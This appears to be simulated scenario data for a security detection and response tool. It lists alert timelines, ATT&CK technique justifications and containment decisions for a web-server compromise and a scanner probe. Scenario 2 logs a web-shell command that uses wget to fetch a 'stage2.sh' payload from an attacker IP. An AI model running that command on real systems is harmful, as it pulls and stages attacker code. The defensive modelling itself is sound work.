scenarios.title: 2. Host Compromise, C2 Beaconing & Database Lateral Movement (prod-db-server)

timeline: [WAF sev=9] 203.0.113.55 -> prod-db-server: Web exploit detected: POST /upload.php SQL injection bypass
[WAZUH sev=9] 203.0.113.55 -> prod-db-server: web shell file created: /var/www/html/uploads/cmd.php
[WAZUH sev=9] 203.0.113.55 -> prod-db-server: process spawned by www-data: /bin/sh -c 'wget http://203.0.113.55/stage2.sh'
[FLOWLOG sev=8] 203.0.113.55 -> prod-db-server: periodic outbound beacon every 30s to C2 203.0.113.55:443
[FLOWLOG sev=9] 203.0.113.55 -> prod-db-server: internal connection attempt -> db tier 10.0.2.15:5432 (lateral movement blocked)

justification.T1190: Exploit Public-Facing Application: Web exploitation payload detected against HTTP service
justification.T1059: Command and Scripting Interpreter: OS command execution or shell invocation attempt
justification.T1505: Server Software Component: Persistent web shell or scheduled task creation
justification.T1071: Application Layer Protocol: Outbound command-and-control beaconing over application layer
justification.T1105: Ingress Tool Transfer: External payload or tool download attempt
justification.T1021: Remote Services: Lateral movement attempt toward internal service tier

decision.justification: Detected post-exploitation, persistence, C2, or lateral movement indicators (T1021, T1059, T1071, T1105, T1190, T1505); host network quarantine via NSG isolation is proportionate.

details.simulated_call: simulated quarantine: replace instance VNIC NSG with quarantine NSG (allowing only Wazuh mgr and admin IP)

scenarios.title: 3. Automated Reconnaissance & Scanner Probing (SQLMap + Nikto on web-server)

timeline: [WAF sev=6] 198.51.100.88 -> dev-web-server: HTTP 403 blocked automated security scanner fingerprint: sqlmap/1.7.2 (rule 913100)
[WAF sev=6] 198.51.100.88 -> dev-web-server: HTTP 403 blocked automated web vulnerability scanner: Nikto/2.1.6 probing (rule 913100)
[FLOWLOG sev=5] 198.51.100.88 -> dev-web-server: port scan: 64 distinct ports probed on target interface in 12s

justification.T1046: Network Service Discovery: Multi-port probing across target host
justification.T1595: Active Scanning: Automated vulnerability scanner reconnaissance fingerprint

decision.justification: Observed reconnaissance scanning or brute-force probing (T1046, T1595); applying temporary WAF rate limiting mitigates impact while minimizing false-positive risk.
